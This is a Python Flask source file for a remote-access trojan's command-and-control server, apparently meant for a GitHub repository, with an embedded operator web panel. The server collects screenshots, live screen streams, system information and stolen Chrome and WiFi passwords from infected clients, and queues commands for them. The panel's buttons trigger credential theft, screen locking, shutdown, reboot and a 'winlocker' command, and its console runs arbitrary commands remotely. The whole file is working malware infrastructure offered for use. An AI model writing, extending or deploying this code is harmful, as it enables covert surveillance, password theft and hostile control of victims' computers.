# =====================================================================
# СЕРВЕР С РАБОЧИМИ ФУНКЦИЯМИ И СТРИМОМ
# Замени server.py на GitHub
# =====================================================================
from flask import Flask, request, jsonify
import time
import base64
import io
import threading

app = Flask(__name__)

clients = {}
commands = {}
streaming_clients = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    client_id = str(int(time.time() * 1000))
    clients[client_id] = {
        "hostname": data.get("hostname"),
        "username": data.get("username"),
        "os": data.get("os"),
        "last_seen": time.time(),
        "data": [],
        "sysinfo": {},
        "chrome_data": "",
        "wifi_data": ""
    }
    commands[client_id] = []
    return jsonify({"id": client_id})

@app.route('/data/<client_id>', methods=['POST'])
def receive_data(client_id):
    if client_id in clients:
        data = request.json
        data_type = data.get("type")
        
        if data_type == "screenshot" or data_type == "stream_frame":
            clients[client_id]["last_screenshot"] = data.get("data", "")
        elif data_type == "sysinfo":
            clients[client_id]["sysinfo"] = data.get("data", {})
        elif data_type == "chrome_passwords":
            clients[client_id]["chrome_data"] = data.get("data", "")
        elif data_type == "wifi_passwords":
            clients[client_id]["wifi_data"] = data.get("data", "")
        elif data_type == "exec_result":
            clients[client_id]["exec_result"] = data.get("data", "")
        
        clients[client_id]["last_seen"] = time.time()
        clients[client_id]["data"].append(data)
    return jsonify({"status": "ok"})

@app.route('/screenshot/<client_id>')
def get_screenshot(client_id):
    if client_id in clients and "last_screenshot" in clients[client_id]:
        try:
            img_data = base64.b64decode(clients[client_id]["last_screenshot"])
            return img_data, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache'}
        except:
            pass
    return "No screenshot", 404

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    if client_id in commands and commands[client_id]:
        cmd = commands[client_id].pop(0)
        if client_id in streaming_clients and cmd.get("command") == "stream_start":
            streaming_clients[client_id] = True
        elif cmd.get("command") == "stream_stop":
            streaming_clients.pop(client_id, None)
        return jsonify(cmd)
    return jsonify({"command": "ping"})

@app.route('/clients', methods=['GET'])
def get_clients():
    result = {}
    for cid, info in clients.items():
        if time.time() - info["last_seen"] < 30:
            result[cid] = {
                "hostname": info["hostname"],
                "username": info["username"],
                "os": info["os"],
                "has_screenshot": "last_screenshot" in info,
                "sysinfo": info.get("sysinfo", {}),
                "chrome_data": info.get("chrome_data", ""),
                "wifi_data": info.get("wifi_data", ""),
                "exec_result": info.get("exec_result", ""),
                "streaming": cid in streaming_clients
            }
    return jsonify(result)

@app.route('/send_command/<client_id>', methods=['POST'])
def add_command(client_id):
    if client_id in commands:
        commands[client_id].append(request.json)
    return jsonify({"status": "ok"})

@app.route('/')
def home():
    return """
<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0f1923; color: #c9d1d9; font-family: 'Segoe UI', Arial; height: 100vh; display: flex; }
        
        .sidebar { width: 260px; background: #1a2733; border-right: 1px solid #2d3a4a; display: flex; flex-direction: column; }
        .sidebar-header { padding: 20px; border-bottom: 1px solid #2d3a4a; }
        .sidebar-header h2 { color: #4fc3f7; font-size: 18px; }
        .sidebar-header .status { color: #81c784; font-size: 12px; margin-top: 5px; }
        .client-list { flex: 1; overflow-y: auto; padding: 10px; }
        
        .client-item { background: #0f1923; border: 1px solid #2d3a4a; border-radius: 8px; padding: 12px; margin-bottom: 8px; cursor: pointer; transition: all 0.2s; }
        .client-item:hover, .client-item.active { border-color: #4fc3f7; background: #1a2733; }
        .client-item .name { color: #4fc3f7; font-weight: 600; font-size: 14px; }
        .client-item .info { color: #8b949e; font-size: 11px; margin-top: 4px; }
        .client-item .dot { width: 8px; height: 8px; background: #81c784; border-radius: 50%; display: inline-block; margin-right: 6px; }
        .client-item .stream-badge { background: #ef5350; color: #fff; font-size: 9px; padding: 2px 6px; border-radius: 4px; margin-left: 6px; }
        .client-item .stream-badge.active { background: #81c784; }
        
        .main-content { flex: 1; display: flex; flex-direction: column; }
        
        .tabs { background: #1a2733; border-bottom: 1px solid #2d3a4a; display: flex; padding: 0 20px; }
        .tab { padding: 10px 20px; cursor: pointer; color: #8b949e; font-size: 13px; border-bottom: 2px solid transparent; }
        .tab:hover { color: #4fc3f7; }
        .tab.active { color: #4fc3f7; border-bottom-color: #4fc3f7; }
        
        .toolbar { background: #1a2733; padding: 10px 20px; display: flex; gap: 6px; flex-wrap: wrap; border-bottom: 1px solid #2d3a4a; }
        .toolbar button { background: #212d3a; color: #4fc3f7; border: 1px solid #2d3a4a; padding: 7px 12px; border-radius: 6px; cursor: pointer; font-size: 11px; transition: all 0.2s; }
        .toolbar button:hover { background: #4fc3f7; color: #0f1923; }
        .toolbar button.red { color: #ef5350; border-color: #ef5350; }
        .toolbar button.red:hover { background: #ef5350; color: #fff; }
        .toolbar button.green { color: #81c784; border-color: #81c784; }
        .toolbar button.green:hover { background: #81c784; color: #0f1923; }
        
        .content-area { flex: 1; display: flex; padding: 10px; gap: 10px; overflow: hidden; }
        
        .panel { background: #1a2733; border-radius: 10px; border: 1px solid #2d3a4a; }
        .screenshot-panel { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .screenshot-panel img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .placeholder { color: #455a64; font-size: 16px; text-align: center; }
        
        .info-panel { width: 400px; padding: 20px; overflow-y: auto; }
        .info-panel h3 { color: #4fc3f7; margin-bottom: 10px; }
        .info-panel .info-row { display: flex; padding: 5px 0; border-bottom: 1px solid #1a2733; font-size: 12px; }
        .info-panel .info-label { color: #8b949e; width: 100px; }
        .info-panel .info-value { color: #c9d1d9; }
        .info-panel pre { background: #0f1923; padding: 10px; border-radius: 5px; font-size: 11px; color: #81c784; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
        
        .console-panel { width: 350px; background: #0d1117; display: flex; flex-direction: column; }
        .console-header { padding: 8px 15px; font-size: 11px; color: #4fc3f7; border-bottom: 1px solid #2d3a4a; }
        .console-output { flex: 1; overflow-y: auto; padding: 8px; font-family: 'Consolas', monospace; font-size: 11px; color: #81c784; }
        .console-input { display: flex; border-top: 1px solid #2d3a4a; }
        .console-input input { flex: 1; background: #0d1117; border: none; color: #81c784; padding: 8px; font-family: 'Consolas', monospace; font-size: 11px; outline: none; }
        .console-input button { background: #4fc3f7; color: #0f1923; border: none; padding: 8px 14px; cursor: pointer; font-weight: 600; }
        
        .log-entry { padding: 2px 0; border-bottom: 1px solid #0f1923; font-size: 11px; }
        .log-entry .time { color: #4fc3f7; margin-right: 6px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">
            <h2>⬡ CONTROL PANEL</h2>
            <div class="status">● Server Online</div>
        </div>
        <div class="client-list" id="clientList">
            <div class="placeholder">Waiting for clients...</div>
        </div>
    </div>
    
    <div class="main-content">
        <div class="tabs">
            <div class="tab active" onclick="switchTab('screen')">📸 Screen</div>
            <div class="tab" onclick="switchTab('info')">💻 System Info</div>
            <div class="tab" onclick="switchTab('passwords')">🔑 Passwords</div>
        </div>
        
        <div class="toolbar" id="toolbar">
            <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
            <button class="green" onclick="sendCmd('stream_start')">📡 Start Stream</button>
            <button class="red" onclick="sendCmd('stream_stop')">⏹ Stop Stream</button>
            <button onclick="sendCmd('sysinfo')">💻 SysInfo</button>
            <button onclick="sendCmd('steal_chrome')">🔑 Chrome</button>
            <button onclick="sendCmd('steal_wifi')">📶 WiFi</button>
            <button class="green" onclick="sendCmd('lock')">🔒 Lock</button>
            <button onclick="sendCmd('unlock')">🔓 Unlock</button>
            <button class="red" onclick="sendCmd('shutdown')">⏻ Off</button>
            <button class="red" onclick="sendCmd('restart')">🔄 Reboot</button>
            <button onclick="sendMsg()">💬 Msg</button>
            <button class="red" onclick="sendCmd('winlocker')">🚫 WinLock</button>
        </div>
        
        <div class="content-area">
            <div class="panel screenshot-panel" id="screenPanel">
                <div class="placeholder">Select client → Screenshot</div>
            </div>
            
            <div class="panel info-panel" id="infoPanel" style="display:none;">
                <h3>System Information</h3>
                <div id="sysinfoContent"><div class="placeholder">Click SysInfo button</div></div>
                <h3 style="margin-top:15px;">Command Output</h3>
                <pre id="execOutput"></pre>
            </div>
            
            <div class="panel info-panel" id="passwordsPanel" style="display:none;">
                <h3>🔑 Chrome Passwords</h3>
                <pre id="chromeContent"><div class="placeholder">Click Chrome button</div></pre>
                <h3 style="margin-top:15px;">📶 WiFi Passwords</h3>
                <pre id="wifiContent"><div class="placeholder">Click WiFi button</div></pre>
            </div>
            
            <div class="panel console-panel">
                <div class="console-header">📋 Console</div>
                <div class="console-output" id="console"></div>
                <div class="console-input">
                    <input type="text" id="cmdInput" placeholder="cmd..." onkeypress="if(event.key==='Enter')execCmd()">
                    <button onclick="execCmd()">▶</button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let selectedClient = null;
        let currentTab = 'screen';
        
        function log(msg) {
            let t = new Date().toLocaleTimeString();
            let c = document.getElementById('console');
            c.innerHTML += `<div class="log-entry"><span class="time">[${t}]</span>${msg}</div>`;
            c.scrollTop = c.scrollHeight;
        }
        
        function switchTab(tab) {
            currentTab = tab;
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById('screenPanel').style.display = tab === 'screen' ? 'flex' : 'none';
            document.getElementById('infoPanel').style.display = tab === 'info' ? 'block' : 'none';
            document.getElementById('passwordsPanel').style.display = tab === 'passwords' ? 'block' : 'none';
        }
        
        function updateClients() {
            fetch('/clients').then(r => r.json()).then(data => {
                let html = '';
                for(let id in data) {
                    let c = data[id];
                    let active = selectedClient === id ? ' active' : '';
                    let streamBadge = c.streaming ? '<span class="stream-badge active">LIVE</span>' : '';
                    html += `<div class="client-item${active}" onclick="selectClient('${id}')">
                        <div class="name"><span class="dot"></span>${c.hostname}${streamBadge}</div>
                        <div class="info">👤 ${c.username} | 💻 ${c.os}</div>
                    </div>`;
                }
                document.getElementById('clientList').innerHTML = html || '<div class="placeholder">No clients</div>';
                
                if(selectedClient && data[selectedClient]) {
                    updateData(data[selectedClient]);
                }
            });
        }
        
        function updateData(c) {
            if(c.has_screenshot && currentTab === 'screen') {
                document.getElementById('screenPanel').innerHTML = `<img src="/screenshot/${selectedClient}?t=${Date.now()}">`;
            }
            if(c.sysinfo && Object.keys(c.sysinfo).length > 0) {
                let html = '';
                for(let k in c.sysinfo) html += `<div class="info-row"><span class="info-label">${k}:</span><span class="info-value">${c.sysinfo[k]}</span></div>`;
                document.getElementById('sysinfoContent').innerHTML = html;
            }
            if(c.chrome_data) document.getElementById('chromeContent').textContent = c.chrome_data;
            if(c.wifi_data) document.getElementById('wifiContent').textContent = c.wifi_data;
            if(c.exec_result) document.getElementById('execOutput').textContent = c.exec_result;
        }
        
        function selectClient(id) {
            selectedClient = id;
            updateClients();
            log(`Selected: ${id}`);
        }
        
        function sendCmd(command) {
            if(!selectedClient) { alert('Select client!'); return; }
            fetch('/send_command/' + selectedClient, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command})
            });
            log(`Sent: ${command}`);
        }
        
        function execCmd() {
            let cmd = document.getElementById('cmdInput').value;
            if(cmd && selectedClient) {
                sendCmd('exec');
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'exec', cmd: cmd})
                });
                document.getElementById('cmdInput').value = '';
            }
        }
        
        function sendMsg() {
            if(!selectedClient) { alert('Select client!'); return; }
            let msg = prompt('Message text:');
            if(msg) {
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'message', text: msg})
                });
                log(`Msg: ${msg}`);
            }
        }
        
        setInterval(updateClients, 2000);
        updateClients();
        log('Ready');
    </script>
</body>
</html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
